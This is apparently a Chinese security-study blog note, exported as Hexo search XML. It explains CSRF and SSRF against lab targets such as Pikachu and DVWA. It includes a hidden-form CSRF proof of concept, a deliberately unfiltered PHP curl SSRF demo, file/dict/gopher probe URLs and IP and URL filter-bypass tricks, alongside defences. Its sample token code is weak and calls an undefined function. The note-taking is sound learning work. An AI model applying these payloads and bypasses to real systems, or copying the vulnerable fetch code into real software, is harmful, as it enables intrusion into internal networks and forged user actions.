<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF与SSRF</title>
    <url>/2023/06/10/CSRF%E4%B8%8ESSRF/</url>
    <content><![CDATA[<h1 id="一、CSRF"><a href="#一、CSRF" class="headerlink" title="一、CSRF:"></a>一、CSRF:</h1><h2 id="漏洞解释与原理"><a href="#漏洞解释与原理" class="headerlink" title="漏洞解释与原理"></a>漏洞解释与原理</h2><h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>跨站请求伪造（Cross-Site Request Forgery，CSRF），完全不同于XSS攻击。</p>
<blockquote>
<p>XSS攻击侧重于获取用户的权限及信息，而CSRF则是攻击者可伪造当前用户的行为，让目标服务器误以为请求由当前用户发起，并利用当前用户权限实现业务请求伪造。</p>
<p>XSS<strong>利用</strong>站点内的信任用户，而CSRF则通过<strong>伪装</strong>成受信任用户请求受信任的网站。</p>
</blockquote>
<p>可见，CSRF侧重于伪造特定用户的请求。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617153429031.png"></p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><blockquote>
<p>攻击者先伪造一个页面，该页面功能就是为了<strong>伪造</strong>当前用户请求。</p>
<p>当用户点击了恶意页面，会<strong>自动</strong>向当前用户的服务器<strong>提交攻击者伪造</strong>的业务请求，这个恶意请求还是<strong>以当前用户的身份</strong>发起的。</p>
</blockquote>
<p>CSRF攻击的效果是在当前用户不知情的情况下，以当前用户的身份发送业务请求并执行。</p>
<h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>要攻击形成有效的CSRF攻击必须满足三个条件：</p>
<p>1）用户处于登录状态。</p>
<p>2）伪造的链接与正常应用请求链接一致。</p>
<p>3）后台未对用户业务开展合法性做校验。</p>
<p><img src="/../../../Typora/img111/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.jpeg" alt="在这里插入图片描述"></p>
<p>一次csrf攻击的必要步骤：</p>
<p>1.受害人登录受信任站点A，并在本地生成Cookie</p>
<p>2.不登出A的情况下，访问危险站点B</p>
<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/k7lkP">http://t.csdn.cn/k7lkP</a></p>
<h2 id="漏洞检测与案例"><a href="#漏洞检测与案例" class="headerlink" title="漏洞检测与案例"></a>漏洞检测与案例</h2><p>pikachu csrf</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617154921395.png" alt="用户lili信息界面"></p>
<p>我们构造一个代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>图片展示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">method</span>=</span></span><br><span class="line"><span class="tag"><span class="string">&quot;post&quot;</span> <span class="attr">role</span>=<span class="string">&quot;form&quot;</span>&gt;</span>  //这个action就是pikachu用户的信息修改界面</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;79&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF@csrf&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;View my pictures&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为实际情况是让用户点击的。</p>
<p>我们略过诱骗的部分，假设用户已经点击了。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617155415181.png"></p>
<p>点击一下View my pictures.</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617161925480.png"></p>
<p>当然了,get型要容易一些，比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/CSRF%20DEMO/GET/content.php?user=user&amp;title=csrf&amp;text=oday&quot;</span>&gt;</span>View my Pictures!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>POST请求方式的复杂之处在于需要创建一个隐藏表单，当用户访问时自动提交表单至目标连接，即可实现CSRF攻击</p>
<h2 id="漏洞场景利用"><a href="#漏洞场景利用" class="headerlink" title="漏洞场景利用"></a>漏洞场景利用</h2><p>虽然属于被动引发，但危害还是有滴。比如：</p>
<p>1）当用户是管理员时，如果存在CSRF漏洞，则攻击者可根据业务功能特点构造语句，在管理员不知情的情况下发起某项业务请求（如添加账号、删除某篇文章等），并且攻击者构造的请求会以当前管理员的身份发出并执行。</p>
<p>2）针对个人用户，如果CSRF漏洞配合存储型XSS漏洞，可实现在当前用户页面上嵌入攻击伪造链接，从而大大增加用户点击的可能性，形成触发攻击的隐患。若社交类网站上存在此类问题，则会产生类似蠕虫的攻击效果。</p>
<p>3）在部分管理系统中，考虑到用户使用系统的便利性，可以在后台Web页面上开发特定功能来实现针对管理系统的参数调整。每次在针对管理系统进行参数调整时，都会向服务器发起一次请求。因此，如果CSRF伪造管理员的高危功能管理请求并诱导管理员执行，那么会对当前系统造成非常大的危害。</p>
<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>CSRF一般是由于Web系统对当前用户身份的验证不足而造成的，比如目标站点并未对提交的请求做合法校验，导致任意请求均可执行（在用户合法登录的前提下，业务流程正常的请求）。</p>
<p>常用的防护手段重点在于为关键业务点添加合理的验证方式，以实现对用户合法身份的二次确认。</p>
<h3 id="1-添加中间环节"><a href="#1-添加中间环节" class="headerlink" title="1.添加中间环节"></a>1.添加中间环节</h3><p>由于攻击者只能仿冒用户发起请求，并不能接收服务器的响应内容，因此可在请求被执行前添加防护措施。主要思路为在发起关键业务的请求时，多添加一步验证环节，并且保证验证环节的内容无法被攻击者获取或碰撞，从而有效避免攻击者伪造请求的情况。这个过程中，常用的方式有以下两种。</p>
<p>1.添加验证过程</p>
<blockquote>
<p>CSRF漏洞可成功利用的一个显著特点是攻击者伪造的用户请求会被服务器实际执行。对此，最有效的手段就是在其中添加一个中间过程，如让用户进行确认，从而可以避免这类问题的出现。</p>
</blockquote>
<p>一般效果就是，提交了修改信息，会弹出一个二次确认框，让用户二次确认。攻击者伪造的页面是接收不到这个确认内容的。</p>
<p>注意的是：确认流程应由页面接受后在前台进行显示，不要利用纯前端的技术来实现，如利用JS代码来实现上述确认功能，否则就会失去原有的意义。</p>
<p>2.验证码</p>
<blockquote>
<p>用户在提交内容时需要输入验证码，利用验证码来确认是否为当前用户发起的请求。验证码对于CSRF攻击防护效果良好，但是验证码最好在关键的业务流程点使用。如果在业务流程中过多使用验证码，会导致用户体验严重下降，直接影响到用户的行为。因此不建议过多使用。</p>
</blockquote>
<h3 id="2-验证用户请求合法性"><a href="#2-验证用户请求合法性" class="headerlink" title="2.验证用户请求合法性"></a>2.验证用户请求合法性</h3><p>防护CSRF漏洞的另一个方面是需要对每次请求的合法性进行校验，保证当前由用户发起的请求为用户本人。这是解决CSRF的成因——伪造用户请求的最直接方式。</p>
<p>1.验证referer</p>
<blockquote>
<p>由于CSRF请求发起方为攻击者，因此在referer处，攻击者与当前用户所处的界面完全不同。可通过验证referer值是否合法，即通过验证请求来源的方式确定此次请求是否正常。但是，在某些情况下referer验证存在缺陷，那么可以利用各种伪造的方式实现对referer验证的绕过。推荐利用referer来监控CSRF行为，如果将其用于防御，效果并不一定良好。</p>
</blockquote>
<p>2.token</p>
<blockquote>
<p>针对CSRF漏洞，在建设Web系统时一般会利用token来识别当前用户身份的真实性。token在当前用户第一次访问某项功能页面时生成，且token是一次性的，在生成完毕后由服务器端发送给客户端。用户端接收到token之后，会在进行下一步业务时提交token，并由服务器进行有效性验证。由于攻击者在CSRF利用时无法获得当前用户的token，导致就算链接发送成功，也会由于没有附带token值，导致针对请求的验证发生错误，当前攻击请求也就无法正常执行。</p>
</blockquote>
<p>基础token代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_start();  </span><br><span class="line">function token_start() &#123;  </span><br><span class="line">    $_SESSION[&#x27;token&#x27;] = md5(rand(1,10000));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">function token_check () &#123;  </span><br><span class="line">    $return = $_REQUEST[&#x27;token&#x27;] === $_SESSION[&#x27;token&#x27;] ? true : false;  </span><br><span class="line">    token_start ();  </span><br><span class="line">    return $return;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">//如果token为空则生成一个token  </span><br><span class="line">if(!isset($_SESSION[&#x27;token&#x27;]) || $_SESSION[&#x27;token&#x27;]==&#x27;&#x27;) &#123;  </span><br><span class="line">    token_start ();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(isset($_POST[&#x27;test&#x27;]))&#123;  </span><br><span class="line">    if(!valid_token())&#123;  </span><br><span class="line">        echo &quot;token fail&quot;;  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        echo &#x27;success，Value:&#x27;.$_POST[&#x27;test&#x27;];  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">/*这里利用10000以内的随机数的MD5值作为token（仅作示例），或者利用PHP基于当前时间（微秒）生成唯一ID的函数unipid（）。之后，根据当前用户提交的情况进行token验证及更新。这里可以看到，在每次访问之后都会进行token更新（无论提交成功还是失败）。*/</span><br></pre></td></tr></table></figure>

<p><strong>使用token时需遵循以下原则：</strong></p>
<p>1）token必须为<strong>一次性</strong>，无论该业务流程执行成功还是失败，在每次用户请求时均重新生成token并在客户端进行更新。</p>
<p>2）token需有较强的<strong>随机性</strong>，避免采取简单的可预测的方式，使攻击者猜测出token的生成规律，进而导致token失效。</p>
<h2 id="csrf漏洞总结"><a href="#csrf漏洞总结" class="headerlink" title="csrf漏洞总结"></a>csrf漏洞总结</h2><p>对于XSS攻击，CSRF攻击的原理、攻击目标均不相同，使用条件也较为苛刻。</p>
<p>与XSS防护不同的是，CSRF防护不会关注对连接、提交参数的过滤，而是重点对业务开展的合法性进行验证，如验证请求是否来自当前用户、在重点功能处添加验证环节、通过token进行验证等。</p>
<ol>
<li>当用户发送重要请求时，需要再输入密码</li>
<li>设置随机token</li>
<li>检验Referer来源，请求时判断请求链接是否为当前管理员正在使用的页面（比如点击危险的修改密码链接时，管理员需要有修改密码的页面，而不是编辑文章的页面）</li>
<li>验证码</li>
<li>限制为只能post请求</li>
</ol>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h1><p>SSRF<br>    是什么<br>        SSRF(Server-Side Request Forgery 服务器请求伪造)<br>        目标 ：从外网无法访问的内部系统<br>        原因 ：服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址过滤和限制<br>    挖掘<br>        web功能上<br>            分享<br>                URL地址分享网页内容<br>            转码服务<br>                通过url地址把原地址网页内容调优使其适合手机屏幕浏览<br>            在线翻译<br>                通过url地址翻译对应文本内容<br>            图片加载与下载<br>                通过url地址加载或下载图片<br>            图片、文章收藏功能<br>            未公开的api实现以及其他调用url功能<br>        URL关键字中找<br>            share<br>            wap<br>            url<br>            link<br>            src<br>            source<br>            target<br>            u<br>            3g<br>            display<br>            domain<br>            source(image)url<br>    验证<br>        基本判断<br>            burpsuite抓包<br>            右键打开图片<br>    绕过<br>        子主题 1<br>        子主题 2</p>
<h2 id="解释：-1"><a href="#解释：-1" class="headerlink" title="解释："></a>解释：</h2><p>服务器端请求伪造（Server-Side Request Forgery，SSRF）是另一种服务器端请求伪造的形式，攻击者可构造由服务器端发起请求的安全漏洞。相对于跨站请求伪造，服务器端请求伪造可让服务器执行一些在用户侧无法实现的效果，如内网探测、加载特定图片和文件等。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617153505685.png"></p>
<p>这种从其他服务器应用获取数据的功能，可以使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。<br>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>SSRF虽然无法直接请求内网的其他主机信息，但是可以借助能访问的服务器，当做跳板，进而进行攻击。（用网站自己打自己内网）</p>
<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><p>在Web应用中，存在着大量需要由服务器端向第三方发起请求的业务。</p>
<p>例如，大多数网站具备的天气显示功能，页面首先会获取当前用户的IP地址，并根据IP地址所在的地理位置信息，向<strong>第三方</strong>天气查询服务器发起请求，最后将结果回显给用户。</p>
<p>这类业务的核心问题在于服务器需根据用户提交的参数进行后续的业务流程，因此如果<strong>用户提交恶意的参数信息，并且服务器未对用户提交的参数进行合法性判断而直接执行后续请求业务，就会导致出现安全隐患，</strong>这也是SSRF漏洞的主要成因。</p>
<p>SSRF攻击相对于CSRF攻击来说，攻击者需伪造的请求为<strong>服务器端发起的内容。</strong></p>
<p><strong>前提：</strong></p>
<blockquote>
<p>Web服务器存在<strong>向其他服务器发起请求并获取数据的功能</strong>，并且获取<strong>过程中并未</strong>对目标地址进行<strong>安全过滤或加以限制</strong>，<strong>导致服务器的请求被伪造</strong>，进而实现后续的攻击。</p>
<p>在某种程度上，可认为SSRF漏洞本质上是利用服务器的高权限实现对当前系统敏感信息的访问。</p>
</blockquote>
<p>由于SSRF漏洞存在的前提是服务器具有主动发起请求的功能，因此如果能控制服务器的漏洞点，那么就可实现大量针对内网及服务器的各类型探测及攻击。</p>
<p>《WEB安全基础》所给的可能存在SSRF漏洞缺陷的目标有以下几种</p>
<blockquote>
<p>·图片加载与下载功能</p>
<p>通过URL地址远程加载或下载图片，常见于很多转载行为或远程加载。由于远程加载图片可有效降低当前服务器的资源消耗，因此得到广泛使用。</p>
<p>·本地处理功能</p>
<p>例如，业务流程中需要对用户输入的参数进行本地处理，如要获取提交的URL中的header信息等，这类业务都会由服务器发起请求。</p>
<p>·各类辅助功能</p>
<p>可针对用户输入的参数添加各类辅助信息，提升参数的可视化效果。</p>
<p>·图片、文章收藏功能</p>
<p>将远程地址进行本地保存，这样可让用户在重新发起请求访问时由服务器重新加载远程地址即可。</p>
<p>以上场景在用户视角理解起来比较抽象。下面通过实际案例讲解SSRF的攻击流程。</p>
</blockquote>
<p>百度给出的ssrf攻击效果为</p>
<blockquote>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/sb9kA">http://t.csdn.cn/sb9kA</a></p>
</blockquote>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h4 id="利用SSRF漏洞寻找本地存在的路径"><a href="#利用SSRF漏洞寻找本地存在的路径" class="headerlink" title="利用SSRF漏洞寻找本地存在的路径"></a>利用SSRF漏洞寻找本地存在的路径</h4><p>先构建一个场景，前端输入目标url，服务器用来获取该url的title信息。</p>
<p>前端代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;lx2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$timeout</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="variable">$timeout</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$file_contents</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;title&gt;(.*)&lt;\/title&gt;/i&quot;</span>,<span class="variable">$file_contents</span>, <span class="variable">$title</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$title</span>[<span class="number">1</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617180525427.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617180615139.png" alt="访问url，获取页面title信息"></p>
<p>此功能是对输入的URL首先发起请求，并利用正则表达式提取响应内容中的title信息此功能是对输入的URL首先发起请求，并利用正则表达式提取响应内容中的title信息</p>
<p>如果我访问我本地的路径</p>
<p><code>http://localhost:81/DVWA/login.php</code></p>
<p>结果为</p>
<blockquote>
<p>Login :: Damn Vulnerable Web Application (DVWA) v1.10 <em>Development</em></p>
</blockquote>
<p>在真实的SSRF漏洞利用过程中，攻击者还会逐步修改提交URL的路径内容，以实现对目标服务器本地路径的全面检查。当路径出现title信息时，可判断存在对应内容，并且可通过title内容来判断路径的功能。如果服务页面没有对用户提交的URL进行范围限定，还可尝试对当前内网连接进行请求，并获取内部的信息。</p>
<h4 id="利用SSRF漏洞来发现内网应用"><a href="#利用SSRF漏洞来发现内网应用" class="headerlink" title="利用SSRF漏洞来发现内网应用"></a>利用SSRF漏洞来发现内网应用</h4><p>这个是说：</p>
<p>假设有两个内网网段，其中内网1用于模拟正常用户，内网2用于模拟服务器。内网1与内网2无法直接互通，只能利用特定服务器实现应用的开展。假设SSRF环境为真实系统，并且具有内网的访问权限。这里利用漏洞环境进行测试，输入已知的内网服务器地址<a href="http://172.29.152.197:8000并提交，可获取到该URL的title信息（我没有配置，不太懂）">http://172.29.152.197:8000并提交，可获取到该URL的title信息（我没有配置，不太懂）</a></p>
<p><a href="https://blog.csdn.net/qq_43625917/article/details/104528645?ops_request_misc=&request_id=&biz_id=102&utm_term=SSRF%E6%BC%8F%E6%B4%9E%E6%9D%A5%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-104528645.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">SSRF漏洞的利用与攻击内网应用_Qwzf的博客-CSDN博客</a></p>
<p>利用这种方式，可以发现原本攻击者网络不可达的功能页面。<strong>SSRF的主要作用是尽可能获取目标系统的内部信息</strong>，这些信息会为攻击者后续攻击提供非常大的便利。假设未来利用其他漏洞获得内网的访问权限，那么即可根据之前发现的链接来尝试获得更多的信息。</p>
<p>根据存在SSRF漏洞的不同业务功能环境，SSRF漏洞可实现的攻击效果为：</p>
<blockquote>
<p>1）对内网Web应用特征进行发现。</p>
<p>2）对服务器所在内网进行各类信息探测。</p>
<p>3）利用File协议读取本地文件。</p>
<p>4）针对特定目标进行攻击时隐藏攻击发起地址。</p>
</blockquote>
<p>总体来说，SSRF漏洞的实际利用方式及利用效果完全受制当前的业务环境。在早期的Web系统中，会存在大量这类需要服务器发起请求的业务功能，但随着互联网应用的快速发展，各类类型的功能趋近于整合，这类需要服务器发起请求的业务功能类型也逐渐减少。而且，SSRF漏洞攻击过程不会直接威胁到系统权限，但仍不能忽视漏洞的威胁。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
<li>1）使用@符号绕过：如<a href="mailto:&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;&#x40;&#101;&#118;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;&#x40;&#101;&#118;&#105;&#x6c;&#46;&#99;&#111;&#x6d;</a></li>
<li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="PHP中可能存在ssrf的函数"><a href="#PHP中可能存在ssrf的函数" class="headerlink" title="PHP中可能存在ssrf的函数"></a>PHP中可能存在ssrf的函数</h3><p>1）file_get_contents():把整个文件读入一个字符串中，该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
<p>CSRF漏洞与SSRF漏洞的主要区别在于伪造目标的不同。其次，两种角色（客户端、服务器端）主要实现的功能也有非常大的区别。但从漏洞防护视角来看，其防护思路及方式非常相似，重点需要针对请求伪造的问题进行处理。即：</p>
<p>·用户请求的合法性。</p>
<p>·服务器行为的合规性。</p>
</blockquote>
<p>有效的手段是在业务开展过程中<strong>针对业务的关键点进行重点内容过滤</strong>。相对CSRF漏洞防护方法来说，更推荐在<strong>SSRF防护</strong>方面优先利用<strong>各类黑白名单手段对用户输入的内容进行合法性识别</strong>，并且严格对用户输入参数进行<strong>格式及长度限制</strong>。</p>
<p>在CSRF漏洞防护中最有效的token防御机制，针对SSRF漏洞则效果较差。</p>
<p>因为ssrf的攻击过程由攻击者自行控制。</p>
<p>百度收集的防御手段：</p>
<blockquote>
<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/sb9kA">http://t.csdn.cn/sb9kA</a></p>
</blockquote>
<h2 id="ssrf总结"><a href="#ssrf总结" class="headerlink" title="ssrf总结"></a>ssrf总结</h2><p>ssrf通过<strong>欺骗服务器发起请求到攻击者指定的URL</strong>，可以是外部URL或内部网络的URL。</p>
